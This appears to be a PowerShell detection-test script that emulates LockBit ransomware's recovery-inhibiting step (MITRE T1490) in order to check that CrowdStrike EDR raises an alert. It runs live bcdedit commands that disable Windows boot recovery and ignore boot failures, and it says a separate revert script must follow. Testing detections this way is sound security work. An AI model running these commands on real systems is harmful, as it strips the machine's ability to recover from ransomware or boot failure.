<#
.SYNOPSIS
    LockBit BCDEdit Recovery Disable - DETECTION TRIGGER
.DESCRIPTION
    Disables Windows boot recovery options using bcdedit.
    Will trigger EDR detection for T1490.
    REQUIRES ADMIN PRIVILEGES.
    TTP: T1490
#>
Write-Host "[*] Starting LockBit Recovery Disable (T1490)" -ForegroundColor Cyan
Write-Host "[*] This will trigger EDR detection for inhibit system recovery" -ForegroundColor Yellow

try {
    # Check if running as admin
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if (-not $isAdmin) {
        Write-Host "[!] WARNING: Not running as Administrator - bcdedit will fail" -ForegroundColor Red
    }
    
    # ACTUAL DETECTION TRIGGER - Disable recovery
    Write-Host "[*] Executing: bcdedit /set {default} recoveryenabled No"
    $result = bcdedit /set "{default}" recoveryenabled No 2>&1
    Write-Host "[*] Result: $result"
    
    Write-Host "[*] Executing: bcdedit /set {default} bootstatuspolicy ignoreallfailures"
    $result2 = bcdedit /set "{default}" bootstatuspolicy ignoreallfailures 2>&1
    Write-Host "[*] Result: $result2"
    
    Write-Host "[+] SUCCESS: Boot recovery options disabled" -ForegroundColor Green
    Write-Host "[!] CrowdStrike should detect: 'BootConfigModified' or 'RecoveryDisabled'" -ForegroundColor Magenta
    
} catch {
    Write-Host "[!] Error: $_" -ForegroundColor Red
}

Write-Host "`n[*] Detection should appear in CrowdStrike within 1-2 minutes" -ForegroundColor Cyan
Write-Host "[!] IMPORTANT: Run the REVERT script to restore recovery options!" -ForegroundColor Red
